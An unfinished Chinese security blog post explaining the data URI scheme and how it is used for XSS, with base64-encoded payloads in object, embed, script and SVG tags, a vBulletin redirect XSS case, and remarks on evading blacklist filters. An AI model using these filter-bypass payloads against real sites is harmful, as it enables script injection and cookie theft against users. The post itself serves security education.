---
layout: post
title: "data uri scheme的那些事"
description: ""
category: 
tags: []
---
{% include JB/setup %}


#参考资料

http://dataurl.net/#dataurlmaker

http://www.gnucitizen.org/blog/self-contained-xss-attacks/

http://sb.f4ck.org/forum.php?mod=viewthread&tid=14202&highlight=data%2Buri

http://en.wikipedia.org/wiki/Data_URI_scheme

http://palizine.plynt.com/issues/2010Oct/bypass-xss-filters/

http://mramydnei.blogspot.jp/2013/12/referrer-xss.html

https://developers.google.com/closure/templates/docs/security

http://blog.kotowicz.net/2012/04/fun-with-data-urls.html

http://dopiaza.org/tools/datauri/index.php






#什么是Data URI scheme

大家对URL(Uniform Resource Location)肯定都很熟悉，URL是URI(Uniform Resource Identifier)常用协议的一个子集。Data URI是[RFC2397](https://www.ietf.org/rfc/rfc2397.txt)定义的一种将小文件直接嵌入文档的方案（RFC2397是1998年发布的）。它的协议格式如下：

	data:[<mime type>][;charset=<charset>][;base64],<encoded data>

	data 指URI协议类型
	mine type 指数据类型，如png图片为 image/png;默认是text/plain
	chartset 制定数据的编码方式，比如base64，默认是charset=US-ASCII
	encoded data 就是编码之后的数据了

下面通过一些示例来理解一下data uri的应用

#data uri的一些使用范例
通常我们在网页中嵌入图片使用的是如下的方式：

	<img src="http://192.168.1.1/images/myimage.gif">


而下面一个img标签的src指向不是一个外部的URL，而是一个data uri。把这个img标签贴到html文档里访问。
	<img src="data:image/gif;base64,R0lGODlhTgAbAPcAAAAAAAAAMwAAZgAAmQAAzAAA/wArAAArMwArZgArmQArzAAr/wBVAABVMwBVZgBVmQBVzABV/wCAAACAMwCAZgCAmQCAzACA/wCqAACqMwCqZgCqmQCqzACq/wDVAADVMwDVZgDVmQDVzADV/wD/AAD/MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMrADMrMzMrZjMrmTMrzDMr/zNVADNVMzNVZjNVmTNVzDNV/zOAADOAMzOAZjOAmTOAzDOA/zOqADOqMzOqZjOqmTOqzDOq/zPVADPVMzPVZjPVmTPVzDPV/zP/ADP/MzP/ZjP/mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YrAGYrM2YrZmYrmWYrzGYr/2ZVAGZVM2ZVZmZVmWZVzGZV/2aAAGaAM2aAZmaAmWaAzGaA/2aqAGaqM2aqZmaqmWaqzGaq/2bVAGbVM2bVZmbVmWbVzGbV/2b/AGb/M2b/Zmb/mWb/zGb//5kAAJkAM5kAZpkAmZkAzJkA/5krAJkrM5krZpkrmZkrzJkr/5lVAJlVM5lVZplVmZlVzJlV/5mAAJmAM5mAZpmAmZmAzJmA/5mqAJmqM5mqZpmqmZmqzJmq/5nVAJnVM5nVZpnVmZnVzJnV/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwAM8wAZswAmcwAzMwA/8wrAMwrM8wrZswrmcwrzMwr/8xVAMxVM8xVZsxVmcxVzMxV/8yAAMyAM8yAZsyAmcyAzMyA/8yqAMyqM8yqZsyqmcyqzMyq/8zVAMzVM8zVZszVmczVzMzV/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8Amf8AzP8A//8rAP8rM/8rZv8rmf8rzP8r//9VAP9VM/9VZv9Vmf9VzP9V//+AAP+AM/+AZv+Amf+AzP+A//+qAP+qM/+qZv+qmf+qzP+q///VAP/VM//VZv/Vmf/VzP/V////AP//M///Zv//mf//zP///wAAAAAAAAAAAAAAACH5BAEAAPwALAAAAABOABsAAAj/AIkIHEiwoMGDCBMqXMiQSBEibxw6dPPwYcSKFCVenFgRosQiGS1+DOkRY8eNIE9+hOiDyA8iLVv+cBOTSBqYMN28bInGZU6ZRHrG1Imz506aPoW6RNry5tCdQQlazPQmosCOVyVmfbh1YEeuK7uKDcvRq9aHPUHt26fMR8aoNgX2XIqT4ty5Ph4ipdsyLhGaEd3mLNIXDWGBfd8IRsxVLdsGPvPi9AnyjZs3h69WreomaBHOFzfDBFtVK0SrmzH7dCjZqo9Pa5Xh8OFjre21gW+v1RQT2u2Hun1k0t0W5trBtfe1vB2tJ9fOWYk4BjWBtm7cy9lCi7YWFEzuyqAt/zPONpoyDW9ic98XrSV3yeR9pNcOqiXNimhhOlZ2w0cP8+KJp88b1a1Fm1vH+eBbTUQYmNg+oFDQkjL7vKFBPfsgJlCC+0BDm1QFNdZddTj0UKIDPaA4mw/vCXRhhSxm2BJw0fSggUDDeUcEBRQqZmBKyVGQ3jIUXJXXfXaxBhtbK1ZHQQ/++SDhDQYidhwRFJrnXXLQ1BNReqC4QSF7ArU40JVrQaNMRNCFKJAm3UEpXCaZaELnlsn18FmW7tmmzIa2ZQIRhPPtI6gP+mR42A9V3hbYQzdh1NKSyqCYnG40TbDWMrd15kOPpSUHkUUQQrTkd8oRxB6C9XjE2kEPwf/JVnWX3paGdYZ21xcR3E1WRJU4sgUTBWpF1CNr6Xn4q4cC3eTRS0UYNmlsTya33lo0NbBWA45d5AM9FQ4kqrNgBpvhoNEo5oZvmmzYHljPGSQrKP3Vyl6FUK7VwwRjDnRtqrpRMJxughLmG3MtpffnaEgRZpJ0sdF6HYwK7jPbBLK+QQE04HIXUTT1cBcNuspEEyZYwoFXn5XKtgmSuHUdSJucMs8sJZQw+TABDohp8GFNByLG4GoPDV10X5K9tNJGOdNsc5Q5y4zTh2A1tJob5BKkGGqG/SXQXgIpffTTNf8cddCCOWya2tHaRsQy0IDy55pVZQIgi3HXx3ZnL2XZNBetMveQ89lAD973T37tBYp5EFEoKChvQP4JpyNrUrKgX++a0Ywe2Xy2nEPE9LPoXcGr0SfKQP4GNJp490Yda8pdsg+m2G3VV0VPNFnUNE8tNdqiI8W33wK9kQkcmdRBhCZ1uDayG6YYf9kbn9wnlMueVoS06L0X7v1opnFetUG5+2pW6Xzr/hdXwBMOPOkzutVa5lcRlZRZ8CKt164oYyX06DgR3PcKtz/KsGQgVpGIU7KHlC+BrwiZiZSniPIQAdImdGZD29SmBp148W8yzjJLAsv3NSIEBAA7" >


可以看到如下一个图片。

![data]({{site.img_url}}datauri1.png)

如果打开burpsuite代理，会发现，并没有新的网络请求。我们看到的这个图片就是base64编码之后保存在html文档里的。也就是前面提到过的将小文件嵌入了html文档。。。当前各种主流的浏览器基本都支持data uri。只是在某些特性方面有差异。本文测试，截图均为firefox。关于data uri在不同浏览器的表现特性后面单独描述。

当然，data uri不仅仅可以把图片嵌入html，还可以把别的文档类型，比如doc，mp3,html等嵌入html。

	<a href="data:application/msword;base64,0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7" >test</a>

用firefox打开这个html文件，点击test，会提示下载一个doc文档。

![data]({{site.img_url}}datauri2.png)

当然script的src属性也是可以用data uri协议的。我的理解一般可以写URL指定资源的地方都可以换成data uri。

	<script src="data:text/javascript;,alert('hello,world')"></script>
	<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+"></object>

![data]({{site.img_url}}datauri3.png)


So，我们看到了可以执行js，而且data uri的payload可以用多种编码，比如base64,从而可以躲避某些黑名单的检测。

#data uri在xss中的利用

提到Data:URI scheme在xss中的应用知名度最高的可能就是黑哥在08年写的一篇博客了。写这篇文章的时候发现RSnake大神在某文章评论说，早在04年左右的时候这个vector就出现在xss cheat里了（参考资料1）。

黑哥博客写的案例是http://seclists.org/fulldisclosure/2008/Jun/181 ，因为这个博客已经打不开了，所以这里复述一下这个案例。

通过访问一下URL触发：

	admincp/index.php?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

源代码 admincp/index.php 98-107

	if (!empty($vbulletin->GPC['redirect']))
	{
    require_once(DIR . '/includes/functions_login.php');
    $redirect = htmlspecialchars_uni(fetch_replaced_session_url($vbulletin->GPC['redirect']));

    print_cp_header($vbphrase['redirecting_please_wait'], '', "<meta http-equiv=\"Refresh\" content=\"0; URL=$redirect\" />");
    echo "<p>&nbsp;</p><blockquote><p>$vbphrase[redirecting_please_wait]</p></blockquote>";
    print_cp_footer();
    exit;
	}

http-equiv 里的url使用data:text/html 实现xss。

这种xss我的理解就是利用一个URL跳转。因为这里本质上就是跳转到一个html页面，只是这个html页面不是用url指定，而是用了data uri协议。直接把这个html页面传了进来。所以这里的xss就相当于跳转到了一个新的页面，而新的页面存在javascript，然后执行了js。这个新页面执行的js当然无法继承跳转之前的页面的域。这种类型的任意url跳转也都可以用data uri变成这种类型的xss。opera曾经出过一个bug，这样执行的js继承了跳转来源页面的域（参考资料2）。这样子的化危害就扩大了。

data uri在xss领域最常见的应用就是前面提到过的用来绕过富文本的过滤器。下面这样一个payload

		<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+"></object>

没有常见的javascript，script之类的敏感词。所以一些黑名单的过滤器可能会漏掉这种情况。但是利用data uri的xss跟通常的xss有些不一样。老外用self-contained xss来命名。因为我们看到data uri的payload通常就是嵌入一个包含js的html文档。而chrome在执行的时候，认为js的域为空白域。

![data]({{site.img_url}}datauri4.png)

只有firefox和opera（只测试了firefox）认为这样执行的js继承了当前页面的域。这样子就是传统意义上的xss，可以直接获取cookie了。

![data]({{site.img_url}}datauri5.png)


可以使用data uri来进行xss的html标签有很多。不仅仅是anchor，iframe，object，image。比如

	<a src="data:text/html;,<script>alert(document.domain)</script>">test</a>
	<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoJ2ZyZWVidWYuY29tJyk7PC9zY3JpcHQ+PC9zdmc+" AllowScriptAccess="always"></EMBED>

		<svg> 
	<use xlink:href="data:image/svg+xml;base64, PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#rectangle" /> 
	</svg>

a标签和embed标签都可以，前面提到说是用url制定外部资源的地方都可以用data uri来指定。那么外部资源类型为html等可以执行js的地方，都可以用来进行data uri xss。

让我吃惊的是firefox在点击a标签的链接时候，执行的js依然继承了来源域。关于firefox这个问题，早在04年就有人给firefox报过bug，不过时至今日。我们看到的就是我们现在看到的样子。。。（参考资料3）


![data]({{site.img_url}}datauri6.png)


data uri 语法fuzz



#data uri在lfi中的利用

#data uri钓鱼





 



##参考资料

[self-contained-xss-attacks](http://www.gnucitizen.org/blog/self-contained-xss-attacks/)

[Universal XSS in Opera](http://blog.detectify.com/post/32947196572/universal-xss-in-opera)

[Prevent data: URLs from being used for XSS](https://bugzilla.mozilla.org/show_bug.cgi?id=255107)
